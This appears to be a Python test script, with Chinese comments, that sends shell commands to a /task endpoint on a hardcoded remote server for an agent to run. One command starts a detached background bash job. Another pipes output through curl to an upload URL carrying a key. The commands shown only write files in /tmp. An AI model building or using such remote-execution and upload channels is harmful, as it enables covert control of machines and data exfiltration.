#!/usr/bin/env python3
import json, time, urllib.request
ECS = "http://47.99.131.12:8081"
# 测试1: 最简后台建目录
CMD1 = r"""( nohup bash -c 'mkdir -p /tmp/r6final; echo hi > /tmp/r6final/t.txt' > /dev/null 2>&1 & ) echo DISPATCHED"""
body = json.dumps({"cmd": CMD1, "id": "mintest-001", "ts": int(time.time())}).encode()
req = urllib.request.Request(ECS + "/task", data=body, headers={"Content-Type": "application/json"}, method="POST")
print("T1 POST ->", urllib.request.urlopen(req, timeout=15).status)
# 测试2: 前台直接建目录(对照组)
CMD2 = r"""{ mkdir -p /tmp/r6final; echo front > /tmp/r6final/front.txt; ls /tmp/r6final/; } 2>&1 | curl -s -m45 -X POST 'http://47.99.131.12:8081/upload?name=r6f_mintest.txt&key=k0u4mail' --data-binary @-"""
body = json.dumps({"cmd": CMD2, "id": "mintest-002", "ts": int(time.time())}).encode()
req = urllib.request.Request(ECS + "/task", data=body, headers={"Content-Type": "application/json"}, method="POST")
print("T2 POST ->", urllib.request.urlopen(req, timeout=15).status)
